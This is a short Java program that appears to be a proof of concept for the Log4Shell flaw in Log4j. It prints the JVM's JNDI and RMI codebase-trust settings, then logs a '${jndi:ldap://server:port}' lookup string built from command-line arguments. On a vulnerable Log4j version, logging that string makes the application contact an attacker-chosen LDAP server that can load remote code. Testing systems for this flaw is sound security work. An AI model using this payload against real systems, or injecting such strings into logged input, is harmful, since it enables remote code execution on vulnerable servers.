package test;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Main {

    private static final Logger logger = LogManager.getLogger("HelloWorld");

    public static void main(String[] args) throws InterruptedException {

        System.out.println("java.rmi.server.codebase:"+System.getProperty("java.rmi.server.codebase"));
        System.out.println("java.rmi.server.useCodebaseOnly:"+System.getProperty("java.rmi.server.useCodebaseOnly"));
        System.out.println("com.sun.jndi.rmi.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase"));
        System.out.println("com.sun.jndi.cosnaming.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.cosnaming.object.trustURLCodebase"));
        System.out.println("com.sun.jndi.ldap.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));

        String server = args[0];
        String port =  args[1];
        logger.error("${jndi:ldap://"+server+":"+port+"}");

    }
}
